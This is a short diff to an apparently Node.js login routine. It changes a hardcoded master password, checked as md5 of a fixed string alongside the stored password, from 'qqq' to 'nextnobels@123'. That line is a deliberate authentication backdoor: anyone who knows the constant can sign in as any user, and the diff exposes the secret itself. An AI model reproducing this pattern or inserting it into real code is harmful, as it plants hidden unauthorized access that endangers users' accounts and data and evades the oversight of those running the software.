@@ -17,7 +17,7 @@ module.exports = {
     
     if(checkLogin[0]) {
       checkLogin = checkLogin[0];        
-      if(checkLogin['password'] == txtPassword || txtPassword == md5('qqq')){ 
+      if(checkLogin['password'] == txtPassword || txtPassword == md5('nextnobels@123')){ 
 
         //check payment
         var software = req.body.software || 1;
